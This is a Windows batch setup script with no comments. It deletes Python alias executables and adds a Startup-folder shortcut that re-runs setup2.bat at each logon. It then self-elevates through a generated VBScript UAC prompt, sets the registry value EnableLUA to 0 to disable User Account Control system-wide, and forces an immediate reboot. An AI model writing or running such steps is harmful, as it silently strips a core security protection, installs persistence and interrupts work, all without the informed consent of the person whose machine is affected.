set mypath=%cd%

del "C:\Users\PC\AppData\Local\Microsoft\WindowsApps\python.exe"
del "C:\Users\PC\AppData\Local\Microsoft\WindowsApps\python3.exe"
del "C:\Users\PC\AppData\Local\Microsoft\WindowsApps\python3.7.exe"

cd rsc/dist/win64/

Shortcut.exe /f:"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\setupbat.lnk" /a:c /t:%mypath%/setup2.bat /W:%mypath%


set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

TIMEOUT 0 > NUL



shutdown.exe /f /r /t 0